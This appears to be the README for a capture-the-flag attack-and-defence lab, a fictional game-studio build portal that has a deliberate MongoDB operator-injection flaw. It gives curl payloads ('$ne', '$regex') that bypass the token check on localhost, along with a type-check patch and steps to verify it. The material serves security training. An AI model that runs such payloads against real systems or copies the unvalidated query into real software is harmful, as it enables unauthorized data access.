# Blockstar Games — Internal Build Portal (Hack & Shield A&D Challenge)

## Service Description
The **Blockstar Games Internal Asset & Build Download Portal** is a
simulated internal developer tool. Blockstar engineers use it to pull dev
builds of in-progress titles — "Blue Alive Redemption," "Automobile
Stealer V," and a handful of others. Deep in the catalog sits a locked,
unnamed entry: an unreleased, highly classified project with ID `gta7`.

**The Vulnerability:** The download endpoint accepts a JSON body and
passes the `dev_token` field straight into a PyMongo query filter:

```python
builds.find_one({"game_id": game_id, "dev_token": dev_token})
```

PyMongo translates Python dicts into MongoDB query operators. If an
attacker sends `dev_token` as a JSON *object* instead of a string (e.g.
`{"$ne": ""}` or `{"$regex": "^.*"}`), MongoDB evaluates it as an operator
rather than comparing it for equality — so the attacker never needs to
know, guess, or brute-force the real token.

## What to Expect (Service Flow)
* `GET /` — the portal UI (dark Blockstar-branded catalog with a request
  modal).
* `GET /api/builds` — public catalog. Non-classified titles show their
  full details. The classified `gta7` entry shows its `game_id` (needed
  for the UI to reference it) but its name and build info are hidden.
* `POST /api/download_build` — the target endpoint. Expects
  `{"game_id": "<id>", "dev_token": "<token>"}` and, on a match, returns
  a generated download link (plus the flag, for the classified record).

## Local Setup & Deployment
Requires a local MongoDB server (`mongod`) running on the default port.

```bash
# 1. Start MongoDB (varies by OS/distro), e.g.:
sudo systemctl start mongod
# or: mongod --dbpath /path/to/data

# 2. Set up and run the portal
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python app.py
```
The service listens on `http://127.0.0.1:5002`. On first run, `app.py`
auto-seeds `blockstar_internal.builds` with five records — four public
dev builds and the classified `gta7` record, each with its own random
64-character `dev_token` and the flag embedded in the `gta7` document.
No manual database setup is needed; later restarts detect the existing
data and skip reseeding.

---

## Attack Phase (Red Team)
Goal: retrieve the flag from the classified `gta7` record without ever
knowing its real `dev_token`.

### Step 1: Recon the catalog
```bash
curl -s http://127.0.0.1:5002/api/builds
```
Four titles show full details. One entry is `"classified": true` with
`"name": "CLASSIFIED PROJECT"` — note its `game_id`.

### Step 2: Try the endpoint normally (expected to fail)
```bash
curl -s -X POST http://127.0.0.1:5002/api/download_build \
  -H "Content-Type: application/json" \
  -d '{"game_id": "gta7", "dev_token": "guess-a-token"}'
```
Without the real 64-character token, this returns a 404. Brute-forcing a
64-character random token isn't realistic — so look at how the field is
used server-side instead.

### Step 3: Send an operator instead of a string
Because the endpoint accepts raw JSON, `dev_token` doesn't have to be a
string at all:

```bash
curl -s -X POST http://127.0.0.1:5002/api/download_build \
  -H "Content-Type: application/json" \
  -d '{"game_id": "gta7", "dev_token": {"$ne": ""}}'
```

or, equivalently:

```bash
curl -s -X POST http://127.0.0.1:5002/api/download_build \
  -H "Content-Type: application/json" \
  -d '{"game_id": "gta7", "dev_token": {"$regex": "^.*"}}'
```

### Step 4: Capture the flag
**Expected output:**
```json
{
  "status": "success",
  "message": "Build access granted.",
  "game": "Grand Theft Aunty VII",
  "build": "UNRELEASED / INTERNAL-ONLY",
  "download_url": "https://cdn.blockstar-internal.local/builds/gta7/package.zip?sig=...",
  "flag": "HNS{blockstar_nosql_unreleased_asset_leaked}"
}
```
The same trick works from the web UI too: open the "CLASSIFIED PROJECT"
card's request modal, open browser dev tools, and replace the outgoing
`dev_token` string with the operator object before the request is sent
(or just replay the request with curl/Burp, as above).

---

## Defense Phase (Blue Team)
Goal: patch the endpoint so operator objects are rejected, while real
string tokens keep working exactly as before.

### Step 1: Locate the vulnerability
In `app.py`, look at `download_build()`. `game_id` and `dev_token` are
read from the JSON body with no type restriction and passed directly into
`builds.find_one(...)`.

### Step 2: Apply the patch
Enforce that both fields are actual strings before they ever reach the
query. Add this check right after the "required fields" check:

```python
if not isinstance(game_id, str) or not isinstance(dev_token, str):
    return jsonify({
        "status": "error",
        "message": "'game_id' and 'dev_token' must be strings.",
    }), 400
```

This rejects any JSON object, array, number, or boolean sent in either
field — including `{"$ne": ""}` and `{"$regex": "..."}` — before PyMongo
ever sees them, since by the time the type check runs they're plain
Python values, not yet part of a query.

### Step 3: Verify the fix
Restart the server, then:
1. **Check the exploit:** re-run the Step 3 `curl` payloads from the
   Attack Phase. Both should now return
   `{"status": "error", "message": "'game_id' and 'dev_token' must be strings."}`
   with a 400 status.
2. **Check the SLA:** confirm a real download still works, e.g. look up
   a non-classified build's token directly in MongoDB
   (`mongosh blockstar_internal --eval 'db.builds.findOne({game_id:"bar1"})'`)
   and POST it normally — it should still return a 200 with a
   `download_url`.

If both checks pass, the patch is correct: legitimate string-token
lookups behave exactly as before, and operator-based injection is closed
off at the input boundary rather than relying on MongoDB or PyMongo to
catch it downstream.